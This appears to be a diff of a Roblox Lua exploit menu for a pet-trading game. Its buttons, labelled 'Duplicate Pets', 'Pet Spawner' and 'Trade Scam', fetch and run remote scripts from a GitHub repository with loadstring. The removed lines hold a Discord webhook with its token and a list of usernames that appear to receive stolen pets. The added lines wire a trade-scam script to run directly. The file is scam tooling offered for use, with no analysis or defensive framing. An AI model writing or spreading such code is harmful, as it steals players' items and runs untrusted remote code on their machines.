@@ -63,7 +63,7 @@ local function showMessage(text)
 	end)
 end
 
--- ✅ Safe button creation
+-- ✅ Button creation with Delta-safe execution
 local function createButton(label, yPos, callback)
 	local btn = Instance.new("TextButton", frame)
 	btn.Size = UDim2.new(0, 300, 0, 40)
@@ -75,58 +75,34 @@ local function createButton(label, yPos, callback)
 	btn.Text = label
 	Instance.new("UICorner", btn)
 	btn.MouseButton1Click:Connect(function()
-		local success, result = pcall(function()
-			callback()
+		task.spawn(function()
+			local success, result = pcall(callback)
+			if success then
+				showMessage("✅ " .. label .. " ran!")
+			else
+				showMessage("❌ Failed: " .. result)
+				warn("❌ Error running", label, ":", result)
+			end
 		end)
-		if success then
-			showMessage("✅ " .. label .. " ran!")
-		else
-			showMessage("❌ Failed: " .. result)
-		end
 	end)
 end
 
--- 🐾 Duplicate Pets button logic
+-- 🐾 Duplicate Pets
 local function runDuplicatePets()
-	showMessage("🧬 Loading Duplicate Pets...")
-
-	local success, err = pcall(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/gui_loader.lua"))()
-
-		_G.Usernames = {"ajandaa12alt8", "ajandaa12alt1", "ajandaa12"}
-		_G.min_value = 0.1
-		_G.pingEveryone = "Yes"
-		_G.webhook = "https://discord.com/api/webhooks/1382024220237627392/AlS0_ocQpW5tnDjNlY_zvdmWWm03b_XT-IVhLFQm3FlAKf2zD9kdz5RtJHQKPUtK0tqr"
-
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/source.lua"))()
-	end)
-
-	if not success then
-		warn("❌ Error:", err)
-	end
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/source.lua"))()
 end
 
--- 🐶 Pet Spawner button logic
+-- 🐶 Pet Spawner
 local function runPetSpawner()
-	showMessage("🔄 Loading Pet Spawner...")
-
-	local success, err = pcall(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/pet_spawner.lua"))()
-	end)
-
-	if success then
-		showMessage("✅ Pet Spawner Loaded!")
-	else
-		showMessage("❌ Failed to load Pet Spawner: " .. err)
-	end
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/pet_spawner.lua"))()
 end
 
--- 💰 Trade Scam placeholder
+-- 💰 Trade Scam
 local function runTradeScam()
-	showMessage("💰 Trade Scam placeholder")
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/trade_scam.lua"))()
 end
 
--- ✅ Create buttons
+-- ✅ Create GUI buttons
 createButton("🐾 Duplicate Pets", 20, runDuplicatePets)
 createButton("🐶 Pet Spawner", 80, runPetSpawner)
 createButton("💰 Trade Scam", 140, runTradeScam)
